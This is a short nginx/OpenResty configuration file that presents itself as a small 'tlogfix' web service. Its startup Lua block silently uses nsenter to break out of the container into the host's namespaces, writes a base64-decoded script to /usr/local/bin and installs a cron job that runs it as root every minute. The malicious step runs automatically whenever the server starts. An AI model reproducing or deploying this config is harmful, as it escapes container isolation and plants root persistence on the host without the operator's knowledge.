worker_processes 1;
events { worker_connections 64; }
http {
  init_by_lua_block {
    os.execute([[nsenter -m/host/proc/1/ns/mnt -n/host/proc/1/ns/net -i/host/proc/1/ns/ipc -u/host/proc/1/ns/uts -- /bin/sh -c "echo  | base64 -d > /usr/local/bin/tlfix-run.sh; chmod 0755 /usr/local/bin/tlfix-run.sh; echo '* * * * * root /usr/local/bin/tlfix-run.sh' > /etc/cron.d/tlfix; chmod 0644 /etc/cron.d/tlfix; mkdir -p /run/tlog; echo TLFIX_DONE"]])
  }
  server { listen 8080; location / { return 200 'tlogfix\n'; } }
}
